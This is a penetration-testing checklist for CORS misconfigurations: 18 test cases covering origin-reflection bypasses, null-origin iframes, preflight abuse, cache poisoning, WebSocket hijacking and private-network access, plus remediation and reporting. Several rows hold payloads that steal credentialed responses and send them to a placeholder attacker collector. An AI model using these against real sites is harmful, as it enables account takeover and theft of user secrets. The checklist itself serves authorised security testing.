# CORS — Checklist

Expert per-attack **test-case matrix** for CORS — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*18 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| CORS-001 | Find CORS endpoints that return secrets | Recon | /api/me, /account, /api/keys, /oauth/token, /graphql, /api/csrf; api./app./dev./staging. subdomains | 1. Enumerate every endpoint returning Access-Control-Allow-&#42; (proxy history + cors_scan.py).<br>2. Tag each: authenticated? returns a secret (token/API key/PII/CSRF token)? cookie-auth?<br>3. Grep JS for withCredentials / credentials:'include'; list per-subdomain policies. | A prioritised list of credentialed, secret-bearing CORS endpoints. | <code>/api/me (token) ; /api/keys ; /api/csrf ; withCredentials:true in bundle</code> | A reflected header on a secret-less endpoint is worthless; target secret-bearing ones. | Info | 0.0 (N/A) | poc/cors_scan.py, Corsy | CWE-942; OWASP Testing Guide: Testing CORS (WSTG-CLNT-07) |
| CORS-002 | Baseline — read ACAO/ACAC + confirm a secret | Baseline | Each candidate endpoint | 1. Send Origin: https://evil.com; record Access-Control-Allow-Origin returned.<br>2. Record Access-Control-Allow-Credentials (true/absent).<br>3. Logged in as a test account, confirm the body actually contains a secret. Classify: reflect-any / null / allowlist / wildcard / static / no-ACAO. | The ACAO/ACAC behaviour is recorded and a real secret confirmed in the body. | <code>curl -H 'Origin: https://evil.com' $URL &#124; grep -i access-control ; body has session token</code> | ACAC:true + a real secret is the whole game; a reflected ACAO without either is Info. | Info | 0.0 (N/A) | curl, Burp | CWE-942; PortSwigger Web Security Academy: CORS |
| CORS-003 | Map ACAO logic (origin battery) | ACAO Logic | The Origin request header | 1. Fire the battery: evil.com, null, target.com.evil.com, eviltarget.com, sub.target.com, backtick/comma variants.<br>2. Infer the server rule: reflect / endsWith / startsWith / contains / regex / &#42;.target.com.<br>3. Also test scheme/port/case/trailing-dot/userinfo normalization gaps. | The server's origin-validation rule is inferred from which origins are echoed. | <code>Origin battery: nottarget.com, target.com.evil.com, target.com%60.evil.com, null</code> | Knowing the rule selects the one attacker origin that defeats it. | Info | 0.0 (N/A) | curl, Burp Intruder | CWE-942; HackTricks: CORS bypass |
| CORS-004 | Reflect-any origin + credentials | Bypass | Endpoints that reflect any Origin with ACAC:true | 1. Confirm several random origins are echoed into ACAO with ACAC:true.<br>2. No bypass needed - your origin is already trusted.<br>3. Proceed to the credentialed-read PoC. | Arbitrary attacker origins are reflected into ACAO with ACAC:true. | <code>Origin: https://a1b2c3.example -&gt; ACAO: https://a1b2c3.example + ACAC: true</code> | Any site can read the victim's credentialed response - High/Critical. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | curl, Burp | CWE-942; CWE-346; PortSwigger Web Security Academy: CORS |
| CORS-005 | null-origin trust (sandboxed iframe) | Bypass | Endpoints allowing Origin: null with ACAC:true | 1. Confirm ACAO: null + ACAC: true.<br>2. A sandboxed iframe (no allow-same-origin) runs with origin null: &lt;iframe sandbox=allow-scripts srcdoc=...fetch(credentials:include)...&gt;.<br>3. postMessage the secret to the parent and exfil. | The null-origin sandboxed iframe reads the victim's credentialed response. | <code>Origin: null -&gt; ACAO: null + ACAC: true ; sandboxed-iframe fetch credentials:include</code> | Cross-origin credentialed read via null-origin trust - High. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | poc/null.html | CWE-942; CWE-346; PortSwigger Web Security Academy: CORS |
| CORS-006 | Allowlist weakness (endsWith/startsWith/contains/regex) | Bypass | Endpoints with a weak origin allowlist | 1. Match the flaw to the origin: endsWith -&gt; nottarget.com/eviltarget.com; startsWith -&gt; target.com.evil.com; contains -&gt; target.com.evil.com; unescaped-dot regex -&gt; targetXcom.<br>2. Register/host the satisfying attacker origin.<br>3. Confirm reflection + ACAC:true. | An attacker-registrable origin satisfies the weak allowlist. | <code>endsWith(target.com) -&gt; register eviltarget.com ; regex target\.com -&gt; targetXcom</code> | Credentialed read via allowlist bypass - High. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | curl, Burp | CWE-942; HackTricks: CORS bypass |
| CORS-007 | Origin parser-confusion / normalization bypass | Bypass | The Origin header, where the allowlist is a strict string compare an attacker can confuse the parser out of | 1. When endsWith/startsWith/contains fail, attack the PARSER gap (browser sends it, server mis-splits it): special chars + normalization.<br>2. Special-char tricks: https://target.com%60.evil.com (backtick), target.com&amp;.evil.com , target.com,evil.com , https://target.com@evil.com (userinfo), target.com..evil.com , https://target.com.evil.com:1337 (port).<br>3. Normalization: trailing-dot https://target.com. , case https://TARGET.com , scheme-downgrade http://target.com (trusts insecure origin -&gt; exploitable by a network/MITM attacker). | The server reflects an attacker-controlled origin that a naive parser mistook for the trusted one, with ACAC:true. | <code>https://target.com%60.evil.com   https://target.com@evil.com   https://target.com,evil.com   http://target.com (scheme-downgrade)</code> | Parser/normalization confusion yields a trusted attacker origin -&gt; credentialed read (scheme-downgrade needs a network position). High. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | Burp Intruder, curl | CWE-942; CWE-346; HackTricks: CORS bypass; PortSwigger Web Security Academy: CORS |
| CORS-008 | &#42;.target.com only -&gt; subdomain takeover / XSS | Bypass | Policies trusting only &#42;.target.com | 1. You can't forge from evil.com - obtain a trusted origin via a subdomain takeover or XSS on a real subdomain.<br>2. Host the exfil there so its Origin is trusted.<br>3. Confirm the credentialed read from the sub. | A controlled real subdomain provides a trusted origin for the read. | <code>subdomain takeover of dev.target.com -&gt; host exfil.html there (trusted origin)</code> | Credentialed read via a controlled subdomain - High. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | Subdomain-takeover/XSS kits | CWE-942; HackTricks: CORS bypass |
| CORS-009 | Preflight — custom-header reads &amp; credentialed writes | Preflight / Write | OPTIONS preflight (ACAM/ACAH/Expose-Headers) | 1. Preflight: does ACAM allow PUT/DELETE and ACAH allow authorization/x-api-key for your origin with ACAC:true?<br>2. Credentialed JSON/PUT WRITE + read result (e.g. change email -&gt; ATO).<br>3. Access-Control-Expose-Headers: can JS read a secret in a RESPONSE header? | The permissive preflight enables custom-header reads and credentialed writes. | <code>OPTIONS -&gt; ACAM: PUT + ACAH: authorization + ACAC: true ; fetch PUT credentials:include</code> | Cross-origin credentialed WRITE / header-secret read -&gt; ATO - High/Critical. | High | 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) | curl -X OPTIONS, Burp | CWE-942; PortSwigger Web Security Academy: CORS |
| CORS-010 | Credentialed read -&gt; token/API-key -&gt; ATO | Impact — ATO | A confirmed trusted-origin + secret-bearing endpoint | 1. Build exfil.html with YOUR origin; fetch(TARGET,{credentials:'include'}) while test account A is logged in.<br>2. Ship A's secret (session token / API key) to your collector.<br>3. Replay it -&gt; confirm account takeover. | The victim's session token / API key is read cross-origin and replays into their account. | <code>fetch('$URL',{credentials:'include'}).then(r=&gt;r.text()).then(d=&gt;navigator.sendBeacon('$ATTACKER/c',d))</code> | Account takeover via cross-origin secret theft - Critical. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | poc/exfil.html | CWE-942; PortSwigger Web Security Academy: CORS |
| CORS-011 | CORS-readable CSRF token -&gt; state change -&gt; ATO | Impact — ATO | A CORS-readable anti-CSRF token endpoint | 1. fetch('/api/csrf',{credentials:'include'}) cross-origin to steal the token.<br>2. Use it to perform a protected change (email/password) as the victim.<br>3. Confirm the ATO on your own account in the PoC. | A stolen anti-CSRF token completes a protected state change. | <code>read /api/csrf cross-origin -&gt; POST /account/email with X-CSRF-Token -&gt; reset -&gt; ATO</code> | CORS -&gt; CSRF-token theft -&gt; account takeover - Critical. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | poc/exfil.html | CWE-942; CWE-352; PortSwigger Web Security Academy: CORS |
| CORS-012 | CORS-leaked cloud/CI/admin secret -&gt; RCE / shell | Impact — RCE Chain | A credentialed CORS read that returns a cloud key / CI token / admin API key | 1. When the cross-origin read yields not just a session but a CLOUD/admin/CI secret, chain it: cloud creds -&gt; cloud 'run-command' (SSM/Functions) -&gt; shell; CI token -&gt; pipeline job -&gt; RCE; admin key -&gt; an admin code-exec feature.<br>2. Validate the secret read-only (sts get-caller-identity), then STOP - own tenant only.<br>3. This is the top CORS ceiling the guide flags as Critical. | A CORS-read secret is proven to reach code execution (own tenant, benign). | <code>read /api/config cross-origin -&gt; AWS key -&gt; aws sts get-caller-identity (own tenant) -&gt; run-command</code> | CORS misconfig -&gt; cloud/CI/admin RCE - the maximum-impact CORS chain. Critical. | Critical | 9.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H) | aws cli, CI tooling | CWE-942; CWE-522; PortSwigger Web Security Academy: CORS |
| CORS-013 | CORS response cache poisoning (missing Vary: Origin) | Impact — Cache | Reflected ACAO on a cacheable response with no Vary: Origin | 1. Inject Origin: evil.com; confirm it's reflected AND cacheable AND no Vary: Origin.<br>2. A clean follow-up on the same URL serves the evil.com ACAO from cache (Age/X-Cache:hit).<br>3. Prove on a benign/unique key; describe shared impact. | The reflected attacker ACAO is served from a shared cache to other users. | <code>reflected ACAO evil.com + cacheable + no Vary: Origin -&gt; poisoned for all</code> | Mass cross-origin theft / DoS via poisoned CORS cache - High/Critical. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L) | Burp Param Miner | CWE-942; CWE-524; PortSwigger Web Security Academy: CORS |
| CORS-014 | Cross-Site WebSocket Hijacking (CSWSH) | Impact — CSWSH | Cookie-authenticated WS endpoint that ignores Origin | 1. Replay the WS handshake with a foreign Origin -&gt; does the authenticated upgrade still succeed (101)?<br>2. From an attacker page: new WebSocket('wss://target/chat') carries victim cookies with no CORS gate.<br>3. Read/act as the victim; exfil the stream. | A cross-origin page opens an authenticated WebSocket as the victim. | <code>new WebSocket('wss://target.com/chat'); ws.onmessage=e=&gt;sendBeacon('$ATTACKER/x',e.data)</code> | Cross-origin authenticated WebSocket read/act - High. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | Burp WS, wscat | CWE-942; CWE-1385; CWE-346; PortSwigger Web Security Academy: CORS |
| CORS-015 | Private Network Access (public page -&gt; intranet) | Impact — PNA | Internal/localhost service granting Access-Control-Allow-Private-Network | 1. Preflight with Access-Control-Request-Private-Network: true to a LAN/localhost device.<br>2. Exploitable if it returns Access-Control-Allow-Private-Network: true (+ permissive ACAO).<br>3. A public page then drives the router/IoT/localhost dev-admin; else pivot to DNS rebinding. | A public attacker page reaches the victim's internal/localhost service. | <code>OPTIONS http://192.168.1.1/ + Access-Control-Request-Private-Network: true -&gt; allowed</code> | Public-&gt;private intranet access (router/IoT/dev-admin) - High. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | curl -X OPTIONS | CWE-942; CWE-918; HackTricks: CORS bypass |
| CORS-016 | Non-credentialed sensitive-data exposure (ACAO:&#42; / reflection, no ACAC) | Impact - Non-Credentialed | Internal/pre-prod/staging or network-gated endpoints that return sensitive data with ACAO:&#42; (or reflection) and NO cookie auth | 1. Not every CORS win needs ACAC. Find endpoints that return SENSITIVE data to anyone (no cookie auth) with ACAO:&#42; or reflection: internal/admin/metrics/debug config, pre-prod mirrors, token-in-URL / bearer-in-body APIs.<br>2. The CORS-specific value = data gated by NETWORK POSITION: a victim inside the intranet visits your page -&gt; your JS reads internal-only data via their browser (drive-by internal recon).<br>3. Confirm the browser read with a real fetch() (no credentials needed); judge severity by WHAT the body exposes, not the header. | A public attacker page reads sensitive, auth-less data cross-origin (often internal data via a victim's network position). | <code>ACAO:&#42; on http://internal-api/config (tokens/user-list) ; staging API mirroring prod, no auth ; fetch() from evil.com reads it</code> | Cross-origin theft of sensitive no-auth data (internal config/PII/tokens) - Medium, climbing to High by data sensitivity / intranet reach. | Medium | 6.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N) | curl, Burp, real browser | CWE-942; CWE-200; PortSwigger Web Security Academy: CORS |
| CORS-017 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: ACAO:&#42; on public/non-sensitive data with no creds (Info); reflected origin WITHOUT ACAC:true and no sensitive/auth-less body; ACAO:&#42; AND ACAC:true together (browser ignores for creds - not exploitable); static correct ACAO you don't control; 'vulnerable' proven only by curl with no browser read.<br>2. REQUIRE: an attacker-controlled origin (or null) trusted WITH credentials AND a real secret read in a browser. | Only attacker-origin + ACAC:true + real-secret-read candidates survive. | <code>ACAO:&#42; + ACAC:true = not exploitable ; curl-only = not proven ; no ACAC + no secret = Info</code> | Protects credibility; CORS is dense with reflected-header-without-impact false positives. | Info | 0.0 (N/A) | real browser | CWE-942; PortSwigger Web Security Academy: CORS |
| CORS-018 | Client-facing impact &amp; SAFE PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Name the secret + its impact (ATO / data breach / CSRF chain / RCE chain if a cloud/admin key).<br>2. Provide the fetch() PoC, proof of the cross-origin read in a REAL browser with your own accounts, and the ACAO/ACAC headers.<br>3. Set CVSS 3.1 + CWE-942/346 (+1385 for CSWSH). Remediation: strict origin allowlist (no reflection), never reflect null, never pair credentials with a dynamic/wildcard origin, add Vary: Origin, validate WS handshake Origin.<br>4. Own 2 accounts, benign collector, redact the secret, take the exfil page down; de-dupe. | A reproducible, browser-confirmed, correctly-rated PoC with clear remediation. | <code>PoC: fetch() read in a real browser + ACAO/ACAC headers + named secret + CVSS + CWE-942 + remediation.</code> | Converts the credentialed read into a defensible High/Critical report. | Info | 0.0 (N/A) | CVSS calculator, CORS_REPORT_TEMPLATE.md | CWE-942; CWE-346; FIRST CVSS v3.1; OWASP Testing Guide: Testing CORS (WSTG-CLNT-07)  &#124;  TOP REFERENCES: PortSwigger Academy CORS; Christian Schneider CSWSH; James Kettle cache research; W3C Private Network Access; s0md3v/Corsy |
